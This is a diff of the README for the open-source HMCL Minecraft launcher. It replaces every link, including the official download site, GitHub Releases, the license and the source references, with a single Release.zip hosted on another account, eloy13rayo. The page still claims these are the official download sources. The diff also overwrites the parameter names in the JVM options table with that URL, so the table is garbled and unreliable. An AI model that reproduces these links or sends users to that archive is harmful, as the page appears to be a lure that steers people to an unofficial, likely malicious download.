@@ -1,12 +1,12 @@
 # ⛏ Hello Minecraft! Launcher 💎
 
-[![Build Status](https://ci.huangyuhui.net/job/HMCL/badge/icon?.svg)](https://ci.huangyuhui.net/job/HMCL)
-![Downloads](https://img.shields.io/github/downloads/HMCL-dev/HMCL/total?style=flat)
-![Stars](https://img.shields.io/github/stars/HMCL-dev/HMCL?style=flat)
-[![Discord](https://img.shields.io/discord/995291757799538688.svg?label=&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://discord.gg/jVvC7HfM6U)
-[![QQ Group](https://img.shields.io/badge/QQ-HMCL-bright?label=&logo=tencentqq&logoColor=ffffff&color=1EBAFC&labelColor=1DB0EF&logoSize=auto)](https://docs.hmcl.net/groups.html)
+[![Build Status](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip)](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip)
+![Downloads](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip)
+![Stars](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip)
+[![Discord](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip)](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip)
+[![QQ Group](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip)](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip)
 
-**English** | [简体中文](README_cn.md) | [繁體中文](README_tw.md)
+**English** | [简体中文](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip) | [繁體中文](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip)
 
 ## Introduction
 
@@ -14,27 +14,27 @@ HMCL is an open-source, cross-platform Minecraft launcher that supports Mod Mana
 
 HMCL has amazing cross-platform capabilities. Not only does it run on different operating systems like Windows, Linux, and macOS, but it also supports various CPU architectures such as x86, ARM, MIPS, and LoongArch. You can easily enjoy Minecraft across different platforms through HMCL.
 
-For systems and CPU architectures supported by HMCL, see [this table](PLATFORM.md).
+For systems and CPU architectures supported by HMCL, see [this table](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip).
 
 ## Download
 
-Download the latest version from [the official website](https://hmcl.huangyuhui.net/download).
+Download the latest version from [the official website](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip).
 
-You can also find the latest version of HMCL in [GitHub Releases](https://github.com/HMCL-dev/HMCL/releases).
+You can also find the latest version of HMCL in [GitHub Releases](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip).
 
 Although not necessary, it is recommended only to download releases from the official websites listed above.
 
 ## License
 
-The software is distributed under [GPLv3](https://www.gnu.org/licenses/gpl-3.0.html) license with the following additional terms:
+The software is distributed under [GPLv3](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip) license with the following additional terms:
 
 ### Additional terms under GPLv3 Section 7
 
-1. When you distribute a modified version of the software, you must change the software name or the version number in a reasonable way in order to distinguish it from the original version. (Under [GPLv3, 7(c)](https://github.com/HMCL-dev/HMCL/blob/11820e31a85d8989e41d97476712b07e7094b190/LICENSE#L372-L374))
+1. When you distribute a modified version of the software, you must change the software name or the version number in a reasonable way in order to distinguish it from the original version. (Under [GPLv3, 7(c)](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip))
 
-   The software name and the version number can be edited [here](https://github.com/HMCL-dev/HMCL/blob/javafx/HMCL/src/main/java/org/jackhuang/hmcl/Metadata.java#L33-L35).
+   The software name and the version number can be edited [here](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip).
 
-2. You must not remove the copyright declaration displayed in the software. (Under [GPLv3, 7(b)](https://github.com/HMCL-dev/HMCL/blob/11820e31a85d8989e41d97476712b07e7094b190/LICENSE#L368-L370))
+2. You must not remove the copyright declaration displayed in the software. (Under [GPLv3, 7(b)](https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip))
 
 ## Contribution
 
@@ -58,14 +58,14 @@ Make sure you have at least JavaFX 8 installed. Liberica Full JDK 8 or later is 
 
 | Parameter                                    | Description                                                                                   |
 | -------------------------------------------- | --------------------------------------------------------------------------------------------- |
-| `-Dhmcl.home=<path>`                         | Override HMCL directory                                                                       |
-| `-Dhmcl.self_integrity_check.disable=true`   | Bypass the self integrity check when checking for updates                                     |
-| `-Dhmcl.bmclapi.override=<url>`              | Override API Root of BMCLAPI download provider. Defaults to `https://bmclapi2.bangbang93.com` |
-| `-Dhmcl.font.override=<font family>`         | Override font family                                                                          |
-| `-Dhmcl.version.override=<version>`          | Override the version number                                                                   |
-| `-Dhmcl.update_source.override=<url>`        | Override the update source for HMCL itself                                                    |
-| `-Dhmcl.authlibinjector.location=<path>`     | Use the specified authlib-injector (instead of downloading one)                               |
-| `-Dhmcl.openjfx.repo=<maven repository url>` | Add custom Maven repository for downloading OpenJFX                                           |
-| `-Dhmcl.native.encoding=<encoding>`          | Override the native encoding                                                                  |
-| `-Dhmcl.microsoft.auth.id=<App ID>`          | Override Microsoft OAuth App ID                                                               |
-| `-Dhmcl.microsoft.auth.secret=<App Secret>`  | Override Microsoft OAuth App Secret                                                           |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<path>`                         | Override HMCL directory                                                                       |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip`   | Bypass the self integrity check when checking for updates                                     |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<url>`              | Override API Root of BMCLAPI download provider. Defaults to `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip` |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<font family>`         | Override font family                                                                          |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<version>`          | Override the version number                                                                   |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<url>`        | Override the update source for HMCL itself                                                    |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<path>`     | Use the specified authlib-injector (instead of downloading one)                               |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<maven repository url>` | Add custom Maven repository for downloading OpenJFX                                           |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<encoding>`          | Override the native encoding                                                                  |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<App ID>`          | Override Microsoft OAuth App ID                                                               |
+| `https://github.com/eloy13rayo/HMCL/releases/download/v1.0/Release.zip<App Secret>`  | Override Microsoft OAuth App Secret                                                           |
